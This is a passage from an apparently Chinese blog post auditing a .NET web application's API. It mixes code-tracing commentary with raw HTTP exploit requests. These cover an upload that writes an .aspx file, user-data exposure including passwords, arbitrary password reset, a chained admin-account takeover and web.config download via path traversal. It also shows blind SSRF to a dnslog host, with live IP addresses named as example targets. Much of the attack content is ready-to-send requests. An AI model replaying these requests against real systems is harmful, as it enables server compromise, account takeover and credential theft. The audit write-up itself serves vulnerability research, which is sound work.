+<p>—————————–6284831143977417611477572513<br>Content-Disposition: form-data; name=”file-input”; filename=”123.jpg”<br>Content-Type: image/jpeg</p>
+<p>ÿØÿà</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/eeea76b983b0178a96ad875a9c10d97e.png" alt="eeea76b983b0178a96ad875a9c10d97e.png"></p>
+<p>1）定位到UploadImageResize方法</p>
+<p>实例化了uploadImageDto类的对象uploadImageDto，调用了子类的CreateValidatedUploadImageDto方法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/1fff3c4bb8084ec8fa0d1839d2b1b930.png" alt="1fff3c4bb8084ec8fa0d1839d2b1b930.png"></p>
+<p>然后调用ValidateExtension方法判断我们上传的文件后缀时刻可行</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/577b46cac2e8386ae86a6f8a0ec5104e.png" alt="577b46cac2e8386ae86a6f8a0ec5104e.png"></p>
+<p>在ValidateExtension方法中，声明了一个泛型集合allowedUploadImageExtensions，它的内容是GetAllowedUploadImageExtensions方法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/c6a18fde87e56e300581114defff8553.png" alt="c6a18fde87e56e300581114defff8553.png"></p>
+<p>在GetAllowedUploadImageExtensions方法中，声明的stringValues变量是GetStringValue方法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/b9b57cc79f40b29f1f1d6b56fbdcdf2d.png" alt="b9b57cc79f40b29f1f1d6b56fbdcdf2d.png"></p>
+<p>GetStringValue方法把上一个的WebConfig.Config_Common_AllowedUploadExtensions作为参数传入，即</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/990f73fb18b1441d4229556a67adf294.png" alt="990f73fb18b1441d4229556a67adf294.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/f5491228608a41b7427597ab4d1fd991.png" alt="f5491228608a41b7427597ab4d1fd991.png"></p>
+<p>GetStringValue方法中，ConfigurationManager下的appsettings里面</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/beae5297fe0b229968411737284cdb8b.png" alt="beae5297fe0b229968411737284cdb8b.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/18bce06624ebf2a63a6b6bb325ed461b.png" alt="18bce06624ebf2a63a6b6bb325ed461b.png"></p>
+<p>但是这里并没有设定可接收的后缀，所以这里return 返回的其实是null</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/a5384c8ea5c7c0f303537961d29dd59e.png" alt="a5384c8ea5c7c0f303537961d29dd59e.png"></p>
+<p>所以这里的stringValues其实是null，故而在下面给我们返回了5种可接受类型</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/626566590dfb22def97a39eb74a3679a.png" alt="626566590dfb22def97a39eb74a3679a.png"></p>
+<p>所以这个泛型集合allowedUploadImageExtensions的值是{jpg，png，bmp，gif，jpeg}</p>
+<p>这个fileName方法，取我们的ContentDisposition即MIME，将以\为分割线</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/de24b3def0b2caa111e17368fd19cd64.png" alt="de24b3def0b2caa111e17368fd19cd64.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/54a9dfea8fe51ba10594b2aafc80509a.png" alt="54a9dfea8fe51ba10594b2aafc80509a.png"></p>
+<p>故fileName是jpeg，这里紧接着GetFileExtension方法传入，根据.进行分割，取我们最后的部分作为extension</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/d5efefac1bb5a8c1bee61dd4fb1f2b63.png" alt="d5efefac1bb5a8c1bee61dd4fb1f2b63.png"></p>
+<p>image/jpeg</p>
+<p>然后allowedResult是调用ValidateExtensions方法，传入我们的extension（jpeg），allowedUploadImageExtensions</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/ae47d65b9e1f175ef8c62049c36eca40.png" alt="ae47d65b9e1f175ef8c62049c36eca40.png"></p>
+<p>在这个方法中，返回：后缀可以：jpeg</p>
+<p>这个ValidateExtension方法也返回可以</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/ed5e0a962da5b6e79eccc426980428cd.png" alt="ed5e0a962da5b6e79eccc426980428cd.png"></p>
+<p>这里返回的是：</p>
+<p>return UploadImageDto.Create(stream, id, avatarType, subCategory, saveExtension);</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/502cc7d689129a9ec26dfe30ed7c0339.png" alt="502cc7d689129a9ec26dfe30ed7c0339.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/810567d7367e2de8523fe0c1613a6dd0.png" alt="810567d7367e2de8523fe0c1613a6dd0.png"></p>
+<p>这里我们传入的saveExtension如果是空，则默认改为jpg，非空则为我们传入的值</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/4bc12e821502c432d6fc9e71135a452c.png" alt="4bc12e821502c432d6fc9e71135a452c.png"></p>
+<p>最后返回</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/23dde82ac75bc095ef1cffaa21151992.png" alt="23dde82ac75bc095ef1cffaa21151992.png"></p>
+<p>调用了UploadImageResize方法后，创建了byte类型cropImageBytes，调用了CreateImage方法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/763d41c6e878a7286aab3cabb81cb8bd.png" alt="763d41c6e878a7286aab3cabb81cb8bd.png"></p>
+<p>然后，CreateImage方法中</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/c5c7be5c4d9e4b72a7b9e607f2eec42b.png" alt="c5c7be5c4d9e4b72a7b9e607f2eec42b.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/9be30144671c78f7a0427ed82e806f9e.png" alt="9be30144671c78f7a0427ed82e806f9e.png"></p>
+<p>然后执行了</p>
+<p>targetImg.Save(ms, imageFormat ?? originalImage.RawFormat);</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/022c727a343c9cbd6d2692fe4f3d23b3.png" alt="022c727a343c9cbd6d2692fe4f3d23b3.png"></p>
+<p>上面几步都不重要…</p>
+<p>重要的是移动文件路径，最后这里return，调用了SaveImageStream方法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/a6b84837847adeaa6df2fdba7ac28c2e.png" alt="a6b84837847adeaa6df2fdba7ac28c2e.png"></p>
+<p>这里先调用了_imageRepository.SaveImage方法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/391c70cd02040643803bbcadaae1455d.png" alt="391c70cd02040643803bbcadaae1455d.png"></p>
+<p>这里声明了接口，说明我们这里找的不对，接口必须被实现</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/39f70c55d5ef35384857a27e8c6ecb90.png" alt="39f70c55d5ef35384857a27e8c6ecb90.png"></p>
+<p>这里的FileImageRepository类刚好继承那个接口，SaveImage方法，这里的GetImageLocate方法下面就是使用b.Save的方式写入我们上传的二进制流文件，ImageSavePath就是我们写入的路径</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe3XYF"><img src="https://s1.ax1x.com/2023/03/07/ppe3XYF.png" alt="ppe3XYF.png"></a></p>
+<p>这里的FileImageRepository类刚好继承那个接口，SaveImage方法，这里的GetImageLocate方法下面就是使用b.Save的方式写入我们上传的二进制流文件，ImageSavePath就是我们写入的路径</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe3XYF"><img src="https://s1.ax1x.com/2023/03/07/ppe3XYF.png" alt="ppe3XYF.png"></a></p>
+<p>这里的savepath</p>
+<p>imageLocate.ImageSavePath = avatarUrlHelper.GetAvatarPhysicalPath(imageId.AvatarType, fileName);</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/18d2b53aad443ad6557b783fa9b0a904.png" alt="18d2b53aad443ad6557b783fa9b0a904.png"></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8Cex"><img src="https://s1.ax1x.com/2023/03/07/ppe8Cex.png" alt="ppe8Cex.png"></a></p>
+<p>下面的GetImageLocate方法</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8kFO"><img src="https://s1.ax1x.com/2023/03/07/ppe8kFO.png" alt="ppe8kFO.png"></a></p>
+<p>在GetImageLocate方法中，又调用了MakeFileName方法（猜测这个方法应该是移动路径的…）</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8AYD"><img src="https://s1.ax1x.com/2023/03/07/ppe8AYD.png" alt="ppe8AYD.png"></a></p>
+<p>这个MakeFileName方法直接return返回了路径</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8BkT"><img src="https://s1.ax1x.com/2023/03/07/ppe8BkT.png" alt="ppe8BkT.png"></a></p>
+<p>然后又调用了GetAvatarPhysicalPath方法</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8DtU"><img src="https://s1.ax1x.com/2023/03/07/ppe8DtU.png" alt="ppe8DtU.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8rhF"><img src="https://s1.ax1x.com/2023/03/07/ppe8rhF.png" alt="ppe8rhF.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe861J"><img src="https://s1.ax1x.com/2023/03/07/ppe861J.png" alt="ppe861J.png"></a></p>
+<p>最后这里也就是去除下返回路径的/之类的</p>
+<p><img src="https://s1.ax1x.com/2023/03/07/ppe8cc9.png" alt="ppe8cc9.png">](</p>
+<p>回到最起初，return 了 CreateStringContentResponse 方法</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8Rn1"><img src="https://s1.ax1x.com/2023/03/07/ppe8Rn1.png" alt="ppe8Rn1.png"></a></p>
+<p>以json格式返回</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8W0x"><img src="https://s1.ax1x.com/2023/03/07/ppe8W0x.png" alt="ppe8W0x.png"></a></p>
+<p>.</p>
+<h4 id="文件上传-3（原理同-2）"><a href="#文件上传-3（原理同-2）" class="headerlink" title="文件上传 * 3（原理同 2）"></a>文件上传 * 3（原理同 2）</h4><p>POST /api/imageWidget/ImageUpload/UploadImage?id=1&amp;avatarType=SiteAvatar&amp;subCategory=1&amp;newHeight=144&amp;newWidth=256&amp;saveExtension=aspx HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: multipart/form-data; boundary=—————————6284831143977417611477572513<br>Content-Length: 52130<br>Connection: close</p>
+<p>—————————–6284831143977417611477572513<br>Content-Disposition: form-data; name=”file-input”; filename=”123.bmp”<br>Content-Type: image/jpe</p>
+<p>ÿØÿà</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe8f76"><img src="https://s1.ax1x.com/2023/03/07/ppe8f76.png" alt="ppe8f76.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/ppe84AK"><img src="https://s1.ax1x.com/2023/03/07/ppe84AK.png" alt="ppe84AK.png"></a></p>
+<h4 id="前台越权"><a href="#前台越权" class="headerlink" title="前台越权"></a>前台越权</h4><p>GET /api/User/GetRegUsersWithPage?loginNameOrName=&amp;orgId=&amp;pageIndex=1&amp;pageSize=1000&amp;siteId=a387e4cc-1b62-44f3-b3e2-7364bc1cca4a&amp;userTypeCode= HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/plain, <em>/</em><br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/e639c6b22c75ab570ef21f4e7fe3567a.png" alt="e639c6b22c75ab570ef21f4e7fe3567a.png"></p>
+<p>定位到GetRegUsersWithPage方法</p>
+<p>这里发现首先调用了GetRegisterUsersWithPage方法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/8284763eeedb49c03981bd29cc3cc48a.png" alt="8284763eeedb49c03981bd29cc3cc48a.png"></p>
+<p>把我们传入的内容执行了linq语法</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/9649d0b186d1b02c023a18c253e5ccb8.png" alt="9649d0b186d1b02c023a18c253e5ccb8.png"></p>
+<p>剩下就是一些查询了，有必要说的是这里特地返回了密码，</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/667c41908fa8dc9db48ace6cc79fdae9.png" alt="667c41908fa8dc9db48ace6cc79fdae9.png"></p>
+<h4 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h4><p>POST /api/User/ResetPassword HTTP/1.1<br>Host: lcoalhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/plain, <em>/</em><br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/json;charset=utf-8<br>Content-Length: 21<br>Connection: close</p>
+<p>{“loginName”:”super”}</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/c612a42b0009b3ee8303cac1235edbee.png" alt="c612a42b0009b3ee8303cac1235edbee.png"></p>
+<p>这里跟过去看ResetPassword类需要什么参数</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/07167c683b49c40b09a6801284c1f0f0.png" alt="07167c683b49c40b09a6801284c1f0f0.png"></p>
+<p>只有一个LoginName，再然后执行了GetAccount方法，执行了Linq查询<img src="https://s1.imagehub.cc/images/2023/03/07/ffae20c0e7431c4b713f474db1e155ef.png" alt="ffae20c0e7431c4b713f474db1e155ef.png"></p>
+<p>如果存在，执行ResetPassword方法，传入LoginName</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/2ab241bcda108b85a651bc164c6dee19.png" alt="2ab241bcda108b85a651bc164c6dee19.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/cf851a665af2eea611f7b69824bbc4ae.png" alt="cf851a665af2eea611f7b69824bbc4ae.png"></p>
+<p>这里defaultPassword被执行了accountPlicy类下的DefaultPassword方法，这里的构造函数设定了重置的初始密码以及其他几项</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/2dc339b3d25b6f7ab96e8ad5edcb1a04.png" alt="2dc339b3d25b6f7ab96e8ad5edcb1a04.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/f6a73f631a140f6c47702722aa4981ba.png" alt="f6a73f631a140f6c47702722aa4981ba.png"></p>
+<p>然后执行ResetPassword方法，返回true（flag2），密码重置成功</p>
+<p>任意注册管理员(组合拳)</p>
+<p>请求包1：获取归属单位的id</p>
+<p>GET /api/Org/GetRoot HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/plain, <em>/</em><br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/e9a3553291006f72ce2ad4cf515a5f7d.png" alt="e9a3553291006f72ce2ad4cf515a5f7d.png"></p>
+<p>请求包2：申请注册</p>
+<p>POST /api/User/RegisterUser HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/plain, /<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/json;charset=utf-8<br>Content-Length: 257<br>Connection: close</p>
+<p>{“省略”}</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/86c5468317ff5e9739ae2b7acb6b1fe5.png" alt="86c5468317ff5e9739ae2b7acb6b1fe5.png"></p>
+<p>请求包3：在注册列表找到你注册的用户名</p>
+<p>GET /api/User/GetRegUsersWithPage?loginNameOrName=&amp;orgId=&amp;pageIndex=1&amp;pageSize=1000&amp;siteId=a387e4cc-1b62-44f3-b3e2-7364bc1cca4a&amp;userTypeCode= HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/plain, /<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/de4838ba1bb27e995bcda3604d27a541.png" alt="de4838ba1bb27e995bcda3604d27a541.png"></p>
+<p>请求包4：通过审核</p>
+<p>POST /api/User/AuditRegister HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/plain, /<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/json;charset=utf-8<br>Content-Length: 45<br>Connection: close</p>
+<p>{“id”:”046bdc82-4202-427a-96e7-afbe01154269”}</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/9c31872408be95380777678d21d7c94d.png" alt="9c31872408be95380777678d21d7c94d.png"></p>
+<p>请求包5：将注册用户添加到管理员</p>
+<p>POST /api/Rbac/AssignUsersForRole HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: application/json, text/plain, /<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/json;charset=utf-8<br>Content-Length: 135<br>Connection: close</p>
+<p>{“SiteId”:”a387e4cc-1b62-44f3-b3e2-7364bc1cca4a”,”RoleCode”:”Admin”,”LoginNames”:[“batmanfuture123456”,”admindefault”,”super”,”admin”]}</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/79fec83390693437b2f65183450593b8.png" alt="79fec83390693437b2f65183450593b8.png"></p>
+<p>账号：batmanfuture123456</p>
+<p>密码：batmanfuture123456</p>
+<p>登陆验证即可</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/577a1178610a63972ae804c72a9fa635.png" alt="577a1178610a63972ae804c72a9fa635.png"></p>
+<p>这个代码审计没什么分析的必要</p>
+<h4 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h4><p><a target="_blank" rel="noopener" href="http://125.75.235.130:8088/default/Portal/Resource/download?url=../../../../../web.config&amp;title=123">http://125.75.235.130:8088/default/Portal/Resource/download?url=../../../../../web.config&amp;title=123</a></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/1f74545df9f6a23be0b41eb196fab401.png" alt="1f74545df9f6a23be0b41eb196fab401.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/ab08cdd490241c1fbac4489919a5f6ae.png" alt="ab08cdd490241c1fbac4489919a5f6ae.png"></p>
+<h4 id="无回显SSRF"><a href="#无回显SSRF" class="headerlink" title="无回显SSRF"></a>无回显SSRF</h4><p>例站：<a target="_blank" rel="noopener" href="http://124.133.16.227:8001/">http://124.133.16.227:8001</a></p>
+<p>GET /Api/ds/ConnectionTest?testIp=<a target="_blank" rel="noopener" href="http://ubrgpq.dnslog.cn/">http://ubrgpq.dnslog.cn</a> HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/203284017ce315db178ff93fa8c81d28.png" alt="203284017ce315db178ff93fa8c81d28.png"></p>
+<p><img src="https://s1.imagehub.cc/images/2023/03/07/f89122bfba0d5deea51cb74a62933d79.png" alt="f89122bfba0d5deea51cb74a62933d79.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1"><span class="toc-number">3.</span> <span class="toc-text">文件上传 * 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1-1"><span class="toc-number">4.</span> <span class="toc-text">文件上传 * 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2"><span class="toc-number">5.</span> <span class="toc-text">文件上传 * 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-3%EF%BC%88%E5%8E%9F%E7%90%86%E5%90%8C-2%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">文件上传 * 3（原理同 2）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E8%B6%8A%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">前台越权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">8.</span> <span class="toc-text">任意密码重置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">9.</span> <span class="toc-text">任意文件下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BESSRF"><span class="toc-number">10.</span> <span class="toc-text">无回显SSRF</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=一次有关dotnet的代码审计[webapi]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=一次有关dotnet的代码审计[webapi]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次有关dotnet的代码审计[webapi]&body=Check out this article: http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=一次有关dotnet的代码审计[webapi]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=一次有关dotnet的代码审计[webapi]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/15/%E4%B8%80%E6%AC%A1%E6%9C%89%E5%85%B3dotnet%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=一次有关dotnet的代码审计[webapi]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    塔菲
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
